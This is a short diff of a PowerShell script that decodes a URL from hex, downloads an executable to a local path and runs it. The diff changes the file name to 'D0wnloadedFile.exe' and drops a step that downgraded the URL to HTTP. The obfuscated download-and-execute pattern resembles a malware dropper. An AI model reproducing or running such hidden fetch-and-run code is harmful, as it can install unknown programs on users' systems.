@@ -77,7 +77,7 @@ Write-Host "Final URL from hex:"
 Write-Host $finalUrl
 
 # Specify the location where the file will be downloaded
-$downloadPath = "S:\DownloadedFile.exe" # Change to your desired path and filename
+$downloadPath = "S:\D0wnloadedFile.exe" # Change to your desired path and filename
 
 # Function to download the file from the URL
 Function Download-File {
@@ -94,15 +94,6 @@ Function Execute-File {
         Write-Error "The file at path $filePath does not exist."
     }
 }
-
-# Ensure the final URL uses HTTP instead of HTTPS
-if ($finalUrl -match '^https://') {
-    $finalUrl = $finalUrl -replace '^https://', 'http://'
-}
-
-# Display the modified final URL for troubleshooting
-Write-Host "Modified final URL (using HTTP):"
-Write-Host $finalUrl
 
 # Proceed with downloading the file using the modified URL
 Download-File -url $finalUrl -path $downloadPath
